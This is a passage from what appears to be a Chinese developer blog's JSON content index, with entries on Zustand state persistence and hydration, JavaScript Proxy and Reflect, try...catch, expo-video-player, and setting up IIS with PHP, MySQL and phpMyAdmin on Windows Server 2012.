4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  export const useStore = create(persist( (set, get) =\u0026gt; ({ newField: 0, // 假设该字段在版本 0 中以其他方式命名  }), { // ...  version: 1, // 如果 storage 中的版本与此迁移不匹配，则会触发：  migrate: (persistedState, version) =\u0026gt; { if (version === 0) { // 如果存储的值在版本为 0 ，则将该字段重命名为新名称  persistedState.newField = persistedState.oldField; delete persistedState.oldField; } return persistedState; }, } ))   merge 合并存储值和state    Schema: (persistedState: Object, currentState: Object) =\u0026gt; Object\n  Default: (persistedState, currentState) =\u0026gt; ({ ...currentState, ...persistedState })\n  在某些情况下，希望使用自定义合并函数将持久值与当前状态合并。\n默认情况下，中间件进行浅合并。如果部分持久化了嵌套对象，那么浅层合并可能还不够。\n例如，如果存储包含以下内容：\n{\rfoo: {\rbar: 0,\r}\r}\r但是你的 Zustand store 包含:\n{\rfoo: {\rbar: 0,\rbaz: 1,\r}\r}\r浅合并将从对象 foo 中擦除 baz 字段。解决此问题的一种方法是提供自定义深度合并功能：\nexport const useStore = create(persist(\r(set, get) =\u0026gt; ({\rfoo: {\rbar: 0,\rbaz: 1,\r},\r}),\r{\r// ...\rmerge: (persistedState, currentState) =\u0026gt; deepMerge(currentState, persistedState),\r}\r))\r3. API persist api 使 React 组件的内部或外部与持久中间件进行大量交互。\n setOptions 更改中间件选项   Schema: (newOptions: PersistOptions) =\u0026gt; void  此方法能够更改中间件选项。请注意，新选项将与当前选项合并。\n例如，这可用于更改 storage 名称：\nuseStore.persist.setOptions({\rname: \u0026quot;new-name\u0026quot;\r});\r甚至更改 storage 引擎：\nuseStore.persist.setOptions({\rgetStorage: () =\u0026gt; sessionStorage,\r});\rclearStorage   Schema: () =\u0026gt; void  这可用于完全清除 storage 中的持久值。\nuseStore.persist.clearStorage();\rrehydrate 触发水合   Schema: () =\u0026gt; Promise\u0026lt;void\u0026gt;  在某些情况下，可能希望手动触发水合。可以通过调用该rehydrate方法来完成。\nawait useStore.persist.rehydrate();\rhasHydrated 获取水合状态   Schema: () =\u0026gt; boolean  这是一个React的 getter，用于了解存储是否已被水合（请注意，在调用useStore.persist.rehydrate()时会更新）。\nuseStore.persist.hasHydrated();\ronHydrate 水合过程开始   Schema: (listener: (state) =\u0026gt; void) =\u0026gt; () =\u0026gt; void  水合过程开始时将调用给定的侦听器。\n1 2 3 4 5 6 7  const unsub = useStore.persist.onHydrate((state) =\u0026gt; { console.log(\u0026#34;hydration starts\u0026#34;); }); // 稍后... unsub();   onFinishHydration 水合过程结束   Schema: (listener: (state) =\u0026gt; void) =\u0026gt; () =\u0026gt; void  当水化过程结束时，将调用给定的侦听器。\n1 2 3 4 5 6 7  const unsub = useStore.persist.onFinishHydration((state) =\u0026gt; { console.log(\u0026#34;hydration finished\u0026#34;); }); // 稍后... unsub();   4. 水合和异步存储 要解释异步存储的“成本”是什么，需要了解什么是水合作用（hydration）。\n1). 什么是水合hydration？ 简而言之，水合是从 storage 中检索持久状态并将其与当前状态合并的过程。\npersist 中间件执行两种 水合hydration：同步和异步。\n如果给定的存储是同步的（例如localStorage），水合将同步完成，如果给定的存储是异步的（例如AsyncStorage），水合将异步完成\u0026hellip;\u0026hellip;🥁。\n但问题是什么？ 在同步水合中，Zustand 在创建 store 时进行水合。在异步水合中，Zustand store 将在稍后的微任务中水合。\n为什么这有关系？ 异步水合可能会导致一些意外行为（成本所在）。例如，\n如果在 React 应用程序中使用 Zustand，store 将不会在初始渲染时水合。\n如果应用程序依赖于页面加载时的持久值，你可能希望等到 store 已被水合后再显示内容\n（例如，应用程序可能认为用户未登录，因为这是默认值，而实际上 store 还没有被水合）。\n2). 如何检查 store 是否已水合 有几种不同的方法可以做到这一点。\nfn1. 可以使用onRehydrateStorage选项来更新 store 中的字段：\nconst useStore = create(\rpersist(\r(set, get) =\u0026gt; ({\r// ...\r_hasHydrated: false\r}),\r{\r// ...\ronRehydrateStorage: () =\u0026gt; () =\u0026gt; {\ruseStore.setState({ _hasHydrated: true })\r}\r}\r)\r);\rexport default function App() {\rconst hasHydrated = useStore(state =\u0026gt; state._hasHydrated);\rif (!hasHydrated) {\rreturn \u0026lt;p\u0026gt;Loading...\u0026lt;/p\u0026gt;\r}\rreturn (\r// ...\r);\r}\rfn2. 还可以创建自定义useHydrationhook：\nconst useStore = create(persist(...))\rconst useHydration = () =\u0026gt; {\rconst [hydrated, setHydrated] = useState(useStore.persist.hasHydrated)\ruseEffect(() =\u0026gt; {\rconst unsubHydrate = useStore.persist.onHydrate(() =\u0026gt; setHydrated(false)) // Note: this is just in case you want to take into account manual rehydrations. You can remove this if you don't need it/don't want it.\rconst unsubFinishHydration = useStore.persist.onFinishHydration(() =\u0026gt; setHydrated(true))\rsetHydrated(useStore.persist.hasHydrated())\rreturn () =\u0026gt; {\runsubHydrate()\runsubFinishHydration()\r}\r}, [])\rreturn hydrated\r}\r5. 如何使用自定义存储引擎？ 如果要使用的存储与预期的 API 不匹配，可以创建自己的存储：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  import create from \u0026#34;zustand\u0026#34; import { persist, StateStorage } from \u0026#34;zustand/middleware\u0026#34; import { get, set, del } from \u0026#39;idb-keyval\u0026#39; // 可以使用任何东西：IndexedDB、Ionic Storage 等  // 自定义 storage 对象 const storage: StateStorage = { getItem: async (name: string): Promise\u0026lt;string | null\u0026gt; =\u0026gt; { console.log(name, \u0026#34;has been retrieved\u0026#34;); return (await get(name)) || null }, setItem: async (name: string, value: string): Promise\u0026lt;void\u0026gt; =\u0026gt; { console.log(name, \u0026#34;with value\u0026#34;, value, \u0026#34;has been saved\u0026#34;); await set(name, value) }, removeItem: async (name: string): Promise\u0026lt;void\u0026gt; =\u0026gt; { console.log(name, \u0026#34;has been deleted\u0026#34;); await del(name) } } export const useStore = create(persist( (set, get) =\u0026gt; ({ fishes: 0, addAFish: () =\u0026gt; set({ fishes: get().fishes + 1 }) }), { name: \u0026#34;food-storage\u0026#34;, //唯一名称  getStorage: () =\u0026gt; storage, } ))   十三、像 Redux 一样编写代码 const types = { increase: \u0026quot;INCREASE\u0026quot;, decrease: \u0026quot;DECREASE\u0026quot; }\rconst reducer = (state, { type, by = 1 }) =\u0026gt; {\rswitch (type) {\rcase types.increase: return { grumpiness: state.grumpiness + by }\rcase types.decrease: return { grumpiness: state.grumpiness - by }\r}\r}\rconst useStore = create(set =\u0026gt; ({\rgrumpiness: 0,\rdispatch: args =\u0026gt; set(state =\u0026gt; reducer(state, args)),\r}))\rconst dispatch = useStore(state =\u0026gt; state.dispatch)\rdispatch({ type: types.increase, by: 2 })\r或者，只需使用redux-middleware。\n它连接你的main-reducer，设置初始 state，并向 state 本身和 vanilla api 添加一个dispatch函数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  import React, { useEffect } from \u0026#39;react\u0026#39; import ReactDOM from \u0026#39;react-dom\u0026#39; import create from \u0026#39;zustand\u0026#39; import { devtools, redux } from \u0026#39;zustand/middleware\u0026#39; import \u0026#39;./styles.css\u0026#39; const initialState = { count: 0 } const types = { increase: \u0026#39;INCREASE\u0026#39;, decrease: \u0026#39;DECREASE\u0026#39; } const reducer = (state, { type, by }) =\u0026gt; { switch (type) { case types.increase: return { count: state.count + by } case types.decrease: return { count: state.count - by } default: return } } const [useStore, api] = create( // 将 store 连接到 devtools  // 如果没有 reducers 和 action-types，你会看到“setState”被注销  devtools( // 将我们的 store 转换为 redux action dispatcher ...  // 向 store 添加一个 dispatch 方法  redux(reducer, initialState) ) ) function Counter() { const count = useStore(state =\u0026gt; state.count) useEffect(() =\u0026gt; { // Increase  setTimeout(() =\u0026gt; api.dispatch({ type: types.increase, by: 3 }), 1000) // Decrease  setTimeout(() =\u0026gt; api.dispatch({ type: types.decrease, by: 1 }), 2000) // Decrease  setTimeout(() =\u0026gt; api.dispatch({ type: types.decrease, by: 1 }), 3000) }, []) return \u0026lt;span class=\u0026#34;header\u0026#34;\u0026gt;{count}\u0026lt;/span\u0026gt; } ReactDOM.render(\u0026lt;Counter /\u0026gt;, document.getElementById(\u0026#39;root\u0026#39;))   十四、在 React 事件处理程序之外调用 actions 如果在 React 事件处理程序之外调用setState，它会同步处理。\n在事件处理程序之外更新状态将强制 react 同步更新组件，因此增加了遇到僵尸子效应的风险。\n为了解决这个问题，需要将 actions 包裹在unstable_batchedUpdates中。\nimport { unstable_batchedUpdates } from 'react-dom' // or 'react-native'\rconst useStore = create((set) =\u0026gt; ({\rfishes: 0,\rincreaseFishes: () =\u0026gt; set((prev) =\u0026gt; ({ fishes: prev.fishes + 1 }))\r}))\rconst nonReactCallback = () =\u0026gt; {\runstable_batchedUpdates(() =\u0026gt; {\ruseStore.getState().increaseFishes()\r})\r}\r十五、使用 Redux 开发工具 1 2 3 4 5 6 7 8 9  import { devtools } from \u0026#39;zustand/middleware\u0026#39; // 使用普通操作存储，它将记录操作为“setState” // devtools 将只记录来自每个单独存储的操作，这与典型的 redux 存储不同 const useStore = create(devtools(store)) // 使用 redux 存储，它将记录完整操作类型 const useStore = create(devtools(redux(reducer, initialState)))   Name store: devtools(store, {name: \u0026quot;MyStore\u0026quot;})，这将在 devtools 中创建一个名为“MyStore”的单独实例。\n序列化选项：devtools(store, { serialize: { options: true } })。\n十六、React context store create 不需要上下文提供程序（context providers）。\n在某些情况下，你可能希望使用上下文进行依赖注入，或者如果你想使用组件中的 props 初始化 store。\n因为 store 是一个钩子，把它作为一个普通的上下文值传递可能会违反钩子的规则。\n为了避免误用，提供了一个特殊createContext。\n1. 创建 createContext import create from 'zustand'\rimport createContext from 'zustand/context'\rconst { Provider, useStore } = createContext()\rconst createStore = () =\u0026gt; create(...)\rconst App = () =\u0026gt; (\r\u0026lt;Provider createStore={createStore}\u0026gt;\r...\r\u0026lt;/Provider\u0026gt;\r)\rconst Component = () =\u0026gt; {\rconst state = useStore()\rconst slice = useStore(selector)\r...\r}\r2. 在组件中使用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48  import create from \u0026#34;zustand\u0026#34;; import createContext from \u0026#34;zustand/context\u0026#34;; // 最佳实践：可以将下面的 createContext() 和 createStore 移动到单独的文件 (store.js) 并导入提供程序Provider，在此处/任何需要的地方使用 store。  const { Provider, useStore } = createContext(); const createStore = () =\u0026gt; create((set) =\u0026gt; ({ bears: 0, increasePopulation: () =\u0026gt; set((state) =\u0026gt; ({ bears: state.bears + 1 })), removeAllBears: () =\u0026gt; set({ bears: 0 }) })); const Button = () =\u0026gt; { return ( {/** store() - 每次使用 Button 组件都创建一个 store，而不是为所有组件使用一个 store **/} \u0026lt;Provider createStore={createStore}\u0026gt; \u0026lt;ButtonChild /\u0026gt; \u0026lt;/Provider\u0026gt; ); }; const ButtonChild = () =\u0026gt; { const state = useStore(); return ( \u0026lt;div\u0026gt; {state.bears} \u0026lt;button onClick={() =\u0026gt; { state.increasePopulation(); }} \u0026gt; + \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; ); }; export default function App() { return ( \u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt; \u0026lt;Button /\u0026gt; \u0026lt;Button /\u0026gt; \u0026lt;/div\u0026gt; ); }   3. createContext 使用 props 初始化（在 TS 中） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  import create from \u0026#34;zustand\u0026#34;; import createContext from \u0026#34;zustand/context\u0026#34;; type BearState = { bears: number increase: () =\u0026gt; void } // 将类型传递给 `createContext` 而不是 `create` const { Provider, useStore } = createContext\u0026lt;BearState\u0026gt;(); export default function App({ initialBears }: { initialBears: number }) { return ( \u0026lt;Provider createStore={() =\u0026gt; create((set) =\u0026gt; ({ bears: initialBears, increase: () =\u0026gt; set((state) =\u0026gt; ({ bears: state.bears + 1 })), })) } \u0026gt; \u0026lt;Button /\u0026gt; \u0026lt;/Provider\u0026gt; ) }   十七、TypeScript 类型定义 1. 类型定义 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  // 可以使用 `type` type BearState = { bears: number increase: (by: number) =\u0026gt; void } // 或者 `interface` interface BearState { bears: number increase: (by: number) =\u0026gt; void } // 它对两者都有效 const useStore = create\u0026lt;BearState\u0026gt;(set =\u0026gt; ({ bears: 0, increase: (by) =\u0026gt; set(state =\u0026gt; ({ bears: state.bears + by })), }))   2. 使用combine 并让 tsc 推断类型 这将两个状态浅合并。\nimport { combine } from 'zustand/middleware'\rconst useStore = create(\rcombine(\r{ bears: 0 },\r(set) =\u0026gt; ({ increase: (by: number) =\u0026gt; set((state) =\u0026gt; ({ bears: state.bears + by })) })\r),\r)\r十八、最佳实践（将store拆分为单独的slice）  目录结构\n  1.store/createBearSlice.js\n const createBearSlice = (set, get) =\u0026gt; ({\reatFish: () =\u0026gt; {\rset((prev) =\u0026gt; ({ fishes: prev.fishes \u0026gt; 1 ? prev.fishes - 1 : 0 }));\r}\r});\rexport default createBearSlice;\r 2.store/createFishSlice.js\n const maxFishes = 10;\rconst createFishSlice = (set, get) =\u0026gt; ({\rfishes: maxFishes,\rrepopulate: () =\u0026gt; {\rset((prev) =\u0026gt; ({ fishes: maxFishes }));\r}\r});\rexport default createFishSlice;\r 3.store/createHoneySlice.js\n const createHoneySlice = (set, get) =\u0026gt; ({\rhoneySlice: {\rhoney: 4\r}\r});\rexport default createHoneySlice;\r 4.store/useStore.js\n import create from \u0026quot;zustand\u0026quot;;\rimport createBearSlice from \u0026quot;./createBearSlice\u0026quot;;\rimport createFishSlice from \u0026quot;./createFishSlice\u0026quot;;\rimport createHoneySlice from \u0026quot;./createHoneySlice\u0026quot;;\rconst useStore = create((set, get) =\u0026gt; ({\r...createBearSlice(set, get),\r...createHoneySlice(set, get),\r...createFishSlice(set, get)\r}));\rexport default useStore;\r 5.pages/Mountain.js\n import useStore from \u0026quot;../store/useStore\u0026quot;;\rexport default function Mountain() {\rconst fishes = useStore((state) =\u0026gt; state.fishes);\rconst eatFish = useStore((state) =\u0026gt; state.eatFish);\rconst repopulate = useStore((state) =\u0026gt; state.repopulate);\rconst honey = useStore((state) =\u0026gt; state.honeySlice.honey);\rreturn (\r\u0026lt;div className=\u0026quot;Mountain\u0026quot;\u0026gt;\r\u0026lt;p\u0026gt;Fishes : {fishes}\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;honey : {honey}\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\r\u0026lt;button onClick={eatFish}\u0026gt;Eat\u0026lt;/button\u0026gt;\r\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\r\u0026lt;button onClick={repopulate}\u0026gt;Repopulate\u0026lt;/button\u0026gt;\r\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r","description":"使用简化的通量原理的小型、快速且可扩展的React状态管理解决方案。有一个基于钩子的舒适 api。这是我感觉最好的React的状态管理库，很可爱。","id":48,"section":"react","tags":null,"title":"zustand","uri":"https://danacoding.github.io/react/zustand/zustand-base/"},{"content":"使用 Proxy 对象，可以更好地控制与某些对象的交互。 每当与对象交互时，代理对象都可以确定行为，例如当我们获取一个值或设置一个值时。\n一般来说，代理是指别人的替身。 您将与联系的人的代理人交谈，而不是直接与该人交谈。 JavaScript 中也会发生同样的情况：我们将与 Proxy 对象交互，而不是直接与目标对象交互。\n\rProxy 代理 创建一个代表 John Doe 的 person 对象。\nconst person = {\rname: \u0026quot;John Doe\u0026quot;,\rage: 42,\rnationality: \u0026quot;American\u0026quot;\r};\r我们希望与代理对象进行交互，而不是直接与该对象交互。 在 JavaScript 中，可以通过创建一个新的 Proxy 实例来轻松地创建一个新的代理。\nconst person = {\rname: \u0026quot;John Doe\u0026quot;,\rage: 42,\rnationality: \u0026quot;American\u0026quot;\r};\rconst personProxy = new Proxy(person, {});\rProxy 的第一个参数是一个代表处理程序的对象。 在处理程序对象中，我们可以根据交互的类型定义特定的行为。 虽然有很多方法可以添加到代理处理程序中，但最常见的两个是 get 和 set：\n get：在尝试访问属性时被调用 set：在尝试修改属性时被调用  实际上，最终会发生以下情况：\n我们将与 personProxy 进行交互，而不是直接与 person 对象交互。\n让我们向 personProxy 代理添加处理程序。 当尝试修改一个属性，从而调用代理上的 set 方法时，我们希望代理记录该属性的先前值和新值。 当试图访问一个属性，从而调用代理上的 get 方法时，我们希望代理记录一个更易读的句子，其中包含该属性的任何值。\n1 2 3 4 5 6 7 8 9 10  const personProxy = new Proxy(person, { get: (obj, prop) =\u0026gt; { console.log(`${prop}的值是 ${obj[prop]}`); }, set: (obj, prop, value) =\u0026gt; { console.log(`将 ${prop}从 ${obj[prop]}更改为 ${value}`); obj[prop] = value; } });   Perfect! 让我们看看当我们尝试修改或检索属性时会发生什么。\n1 2 3  personProxy.name; //name 的值是 John Doe personProxy.age = 43; //年龄从 42 更改为 43   在访问 name 属性时，Proxy 返回了一个更好听的句子：name 的值是 John Doe。\n在修改 age 属性时，Proxy 返回了该属性的上一个值和新值：将年龄从 42 更改为 43。\n\r\r代理可用于添加验证。 用户不应该能够将人的年龄更改为字符串值，或者给他一个空的名字。 或者，如果用户试图访问对象上不存在的属性，我们应该让用户知道。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  const personProxy = new Proxy(person, { get: (obj, prop) =\u0026gt; { if (!obj[prop]) { console.log( `嗯..目标对象上似乎不存在此属性` ); } else { console.log(`${prop}的值是 ${obj[prop]}`); } }, set: (obj, prop, value) =\u0026gt; { if (prop === \u0026#34;age\u0026#34; \u0026amp;\u0026amp; typeof value !== \u0026#34;number\u0026#34;) { console.log(`抱歉，您只能传递年龄的数值。`); } else if (prop === \u0026#34;name\u0026#34; \u0026amp;\u0026amp; value.length \u0026lt; 2) { console.log(`您需要提供一个有效的 name。`); } else { console.log(`将 ${prop}从 ${obj[prop]}更改为 ${value}。`); obj[prop] = value; } } });   让我们看看当我们试图传递错误值时会发生什么！\n1 2 3 4  personProxy.nonExistentProperty; //嗯..这个属性似乎不存在 personProxy.age = \u0026#34;44\u0026#34;; //抱歉，您只能传递年龄的数值 personProxy.name = \u0026#34;\u0026#34;; //您需要提供一个有效的名称   Proxy 代理确保我们没有修改具有错误值的 person 对象，这有助于我们保持数据纯净！\n\rReflect 映射 JavaScript 提供了一个名为 的内置对象Reflect，它使我们在使用代理时更容易操作目标对象。\nReflect 是一个内置的对象，它提供拦截 JavaScript 操作的方法。\n这些方法与 proxy handlers 的方法相同。\nReflect 不是一个函数对象，因此它是不可构造的。\n在上面，我们尝试通过使用括号表示法直接获取或设置值来修改和访问代理内目标对象的属性。 现在，我们可以使用 Reflect 对象。 Reflect 对象上的方法与处理程序对象上的方法同名。\n可以通过 Reflect.get() 和 Reflect.set() 访问或修改目标对象上的属性，而不是通过 obj[prop] 访问属性或通过 obj[prop] = value 设置属性。 这些方法接收与处理程序（handlers）对象上的方法相同的参数。\n1 2 3 4 5 6 7 8 9 10  const personProxy = new Proxy(person, { get: (obj, prop) =\u0026gt; { console.log(`${prop}的值是 ${Reflect.get(obj, prop)}`); }, set: (obj, prop, value) =\u0026gt; { console.log(`将 ${prop}从 ${obj[prop]}更改为 ${value}`); Reflect.set(obj, prop, value); } });   Perfect! 我们可以使用 Reflect 对象轻松访问和修改目标对象的属性。\n1 2 3 4  personProxy.name; //name 的值是 John Doe personProxy.age = 43; //年龄从 42 更改为 43 personProxy.name = \u0026#34;Jane Doe\u0026#34;; //将名字从 John Doe 更改为 Jane Doe   \r结语 Proxy 是一种强大的方式来添加对对象行为的控制。 代理可以有各种用例：它可以帮助验证、格式化、通知或调试。\n过度使用 Proxy 对象或对每个处理程序方法调用执行繁重的操作很容易对应用程序的性能产生负面影响。\n最好不要对性能关键代码使用 Proxy。\n\r知识点  Proxy Reflect  ","description":"拦截和控制与目标对象的交互","id":49,"section":"patterns","tags":null,"title":"代理模式","uri":"https://danacoding.github.io/patterns/design-patterns/proxy-patterns/"},{"content":"try\u0026hellip;catch语句标记要尝试的语句块，并指定一个出现异常时抛出的响应。\n1 2 3 4 5 6 7 8 9 10 11  try { // 尝试运行这段代码 } catch(err) { // 如果有任何错误，代码会抛出错误 } finally { // 无论是否出错，始终运行此代码  // 这个块是可选的 }   ","description":"try...catch语句标记要尝试的语句块，并指定一个出现异常时抛出的响应。","id":50,"section":"jsts","tags":null,"title":"错误处理，try{...}catch{...}","uri":"https://danacoding.github.io/jsts/function/try-catch/"},{"content":"expo-video-player\nStep.1 安装 expo install expo-video-player\rexpo install expo-av @react-native-community/netinfo @react-native-community/slider\rStep.2 使用 import { Video } from 'expo-av'\rimport VideoPlayer from 'expo-video-player'\r\u0026lt;VideoPlayer\rvideoProps={{\rshouldPlay: true,\rresizeMode: Video.RESIZE_MODE_CONTAIN,\rsource: {\ruri: 'http://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4',\r},\r}}\rinFullscreen={true}\r/\u0026gt;\r视频列表解决思路  用图片作为列表 用model模态框作为全屏视频播放的窗口 点击图片触发模态框加载视频自动播放  \u0026lt;Button onPress={() =\u0026gt; setVisible(true)}\u0026gt;\rTOGGLE MODAL\r\u0026lt;/Button\u0026gt;\r\u0026lt;Modal\rvisible={visible}\rbackdropStyle={styles.backdrop}\ronBackdropPress={() =\u0026gt; setVisible(false)}\u0026gt;\r\u0026lt;Button style={styles.closebutton} onPress={() =\u0026gt; setVisible(false)} accessoryLeft={closeIcon} /\u0026gt;\r\u0026lt;View style={{paddingBottom: 0}}\u0026gt;\r\u0026lt;VideoPlayer\rvideoProps={{\rshouldPlay: true,\rresizeMode: Video.RESIZE_MODE_CONTAIN,\r// source: {\r// uri: 'http://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4',\r// },\rsource: require('../assets/videos/big_buck_bunny.mp4')\r}}\rshowControlsOnLoad={true}\rinFullscreen={true}\rshowFullscreenButton={false}\r/\u0026gt;\r\u0026lt;/View\u0026gt;\r\u0026lt;/Modal\u0026gt;\r","description":"","id":51,"section":"react-native","tags":null,"title":"expo-video-player","uri":"https://danacoding.github.io/react-native/expo/expo-video-player/"},{"content":"Windows Server 2012 R2 x64 IIS服务器 PHP环境搭建\n阿里云服务器ECS Windows Server 2012 R2 64位中文标准版下手动搭建PHP环境。\n IIS8.5 + MySQL5.6.15 + PHP5.5.19 + FastCGI + phpMyAdmin4.2.12\n 特别注意：服务器内存不能低于2G，否则安装iis的过程中会报错：0x80070008。\nStep1. 相关软件准备 完整安装包下载地址：http://pan.baidu.com/s/1c0F6g0K\n安装包解压密码：www.imaoye.com\nStep2. 安装IIS8.5  进入添加角色和功能向导 下一步 基于角色或基于功能的安装，下一步 从服务器池中选择服务器，下一步 选择服务器角色，点击Web服务器（IIS） 直接点击添加功能 确定已经勾选Web服务器（IIS）后，下一步 直接点击下一步 直接点击下一步 根据自己的需求选择服务，建议选择全部功能。往下拉滚动条至应用程序开发并点击前面的右三角形展开选项。 重点确定CGI选项被勾选，确定无误，下一步 点击安装   安装成功后，点击关闭，返回服务器管理器在角色和服务器组可查看到IIS。\n  打开 IE，地址栏中输入：127.0.0.1，显示Windows Server界面，则IIS8.5安装成功。\n Step3. 安装及配置PHP5.5  在安装PHP之前，先安装支持PHP运行的两个重要组件\n  vcredist_x64.exe (For VS2012) vcredist_x86.exe (For VS2012)   个人选择： 在D盘新建PHPServer文件夹，并在该文件夹内新建 PHP MySQL MySQLdata wwwroot4个文件夹。 解压php-5.5.19-nts-Win32-VC11-x86.zip文件，将解压文件夹内的所有文件复制到新建的PHP文件夹中。 复制文件夹内的php.ini-production文件，将生成的副本重命名为php.ini。   注：php.ini-development适合开发测试，如本地测试环境；php.ini-production 拥有较高的安全性设定，适合服务器上线运营产品，根据自己的需 求选择文件配置。\n 配置php.ini文件，右键php.ini文件，用Notepad++ 或者记事本打开。  \u0026gt; 注意：开启PHP某个模块和功能，必须去掉前面的分号 “;”\r- 第202行 开启短标签 short_open_tag = On\r- 第721行 设置PHP模块路径 extension_dir = \u0026quot;D:\\PHPServer\\PHP\\ext\u0026quot;\r- 第738行 开启CGI cgi.force_redirect = 0\r- 第766行 开启CGI fastcgi.impersonate = 1\r- 第778行 开启CGI cgi.rfc2616_headers = 1\r----开启扩展模块----\r- 第864行 extension=php_curl.dll\r- 第866行 extension=php_gd2.dll\r- 第873行 extension=php_mbstring.dll\r- 第874行 extension=php_exif.dll\r- 第875行 extension=php_mysql.dll\r- 第876行 extension=php_mysqli.dll\r- 第881行 extension=php_pdo_mysql.dll\r- 第895行 extension=php_sockets.dll\r- 第899行 extension=php_xmlrpc.dll\r----设置时区----\r- 第913行 date.timezone = PRC\r至此php.ini基本配置完成，保存后退出\n配置IIS支持PHP运行  1). 打开服务器管理器，点击工具，选择第一个Internet Information Services（IIS）管理器\n2). 点击起始页下面的计算机/实例名称，中间位置iis部分找到处理程序映射\n3). 双击处理程序映射进入，点击右边操作下面的添加模块映射\n4). 弹出添加模块映射对话框，按照以下内容填写\n 请求路径：*.php 模块：FastCgiModule 可执行文件（可选）：D:\\PHPServer\\PHP\\php-cgi.exe 名称：FastCGI  5). 点击确定\n6). 点击是\n7). 回到主页，在IIS部分找到FastCGI设置选项\n8). 双击进入FastCGI设置，右键D:PHPServerPHPphp-cgi.exe 选择编辑\n9). 弹出编辑FastCGI应用程序对话框\n10). 点击环境变量--（集合）右边的...，弹出EnvironmentVariables合集编辑器，点击左下角添加\n11). 在右边的杂项下面，填入对应值\n Name：PHP_FCGI_MAX_REQUESTS Value：1000  12). 点击确定\n13). 在监视对文件所做的更改选项中选择我们配置的php.ini文件路径\n14). 点击确定\n15). 回到主页，在中间的IIS部分，双击默认文档选项\n16). 进入默认文档页后，根据自己的需求添加或者删除默认文件名称，在此，我们点击右边操作下面的添加，添加index.php\n17). 点击确定\n18). 此时，默认文档已经成功添加index.php,接下来测试一下PHP程序是否运行正常。\n19). 点击IIS管理器 左边网站选项，点击下面的Default Web Site，右键删除，或者点击右边操作选项下的删除按钮都可以，删除默认站点\n20). 删除后，右键网站选项，添加网站\n21). 进入添加网站页\n 网站名称：（可自定义，给你自己看的） 物理路径：选择之前新建的wwwroot文件夹作为网站的根目录 点击“确定”  22). 然后打开D:\\PHPServer\\wwwroot文件夹\n 新建一个index.php 文件，写入以下内容：  \u0026lt;?php\rphpinfo();\r?\u0026gt;\r保存退出\n23). 打开浏览器，输入127.0.0.1 或者 服务器的公网IP 都可以，回车看效果\n当看到PHP版本页面的时候，说明PHP程序已经配置成功，运行正常。\nStep4. 安装及配置MySQL5.6 1.双击运行mysql-installer-community-5.6.15.0.msi文件\n2.选择Install MySQL Products,安装MySQL\n3.勾选I accept the license terms（我接受上述条款），点击“Next（下一步）”\n4.勾选Skip the check for update (not recommended) 跳过检查更新，点击“Next（下一步）”\n5.选择“Custom”（用户自定义安装）\n 注意右边，修改安装路径，以防重装系统后，需要再次安装MySQL Installation Path（安装路径）：D:\\PHPServer\\MySQL Data Path（数据库存放路径）：D:\\PHPServer\\MySQLdata 点击“Next”  6.确定MySQL Server 5.6.15被选中后，点击“Next”\n7.点击Execute （执行）\n开始安装 -\u0026gt; 弹出对话框，勾选“我已阅读并接受许可条款”，点击“安装” -\u0026gt; 安装完毕，点击“完成” -\u0026gt; 点击“Execute （执行） -\u0026gt; 点击“Next” -\u0026gt; 点击“Execute （执行）” -\u0026gt; 逐个安装中 -\u0026gt; 全部安装完毕后，点击“Next” -\u0026gt; 点击“Next” -\u0026gt;\n8.Config Type (服务器类型)，我们选择第二种Server Machine\n9.确定勾选“Enable TCP/IP Networking”（开启TCP/IP网络端口）\nPort Number（端口）：3306\n勾选Open firewall port for network access（打开防火墙端口网络访问）\n点击“Next”\n10.设置MySQL密码，这个一定要记住而且很重要。密码设置好后，点击“Next” 点击“Next” -\u0026gt; 点击“Next” -\u0026gt; 安装完成，点击“Next” -\u0026gt; 点击“Finish （完成）”\n11.关闭此窗口\n12.点击桌面左下角第一个开始图标，进入开始页面\n13.点击开始页面中，最下面的向下的小箭头，进入应用界面\n14.找到MySQL5.6 Command Line Client，点击它，进入MySQL命令控制台\n15.输入，我们刚刚设定的MySQL密码，回车\n16.看到了这个welcome界面后，MySQL已经成功安装！关闭窗口\nStep5. 安装phpMyAdmin 1.解压phpMyAdmin-4.2.12-all-languages.zip，复制解压文件夹中的phpMyAdmin-4.2.12-all-languages文件夹到D:\\PHPServer\\wwwroot\n2.然后，打开服务器管理器\u0026ndash;工具\u0026ndash;Internet Information Services（IIS）管理器\u0026ndash;计算机名称\n3.点击刚刚建的测试站点，切换到“内容视图”\n4.双击视图中的phpMyAdmin-4.2.12-all-languages文件夹，找到index.php文件，右键\u0026ndash;浏览\n5.进入phpMyAdmin登录页面\n用户名：root\n密码：MySQL登录密码\n点击“执行”\n6.配置伪静态模块\n 双击运行“rewrite_x64_zh-CN.msi” 在网站根目录下新建文件web.config，添加伪静态规则代码即可实现网站静态化。 也可以根据自己实际需求，用其他的方法配置伪静态规则   至此，在阿里云云服务器ECS Windows Server 2012 R2 64位中文标准版操作系统下手动搭建PHP环境全部完成。（IIS8.5 + MySQL5.6.15 + PHP5.5.19 + FastCGI + phpMyAdmin4.2.12 ）\n 其他： dedecms自动安装的时候， 将www6中的文件复制到wwwroot中，就可以通过客户端访问安装了。\n因为没有开启写入权限，去到服务器那里，开启权限写入就可以了。\n","description":"","id":52,"section":"others","tags":null,"title":"IIS 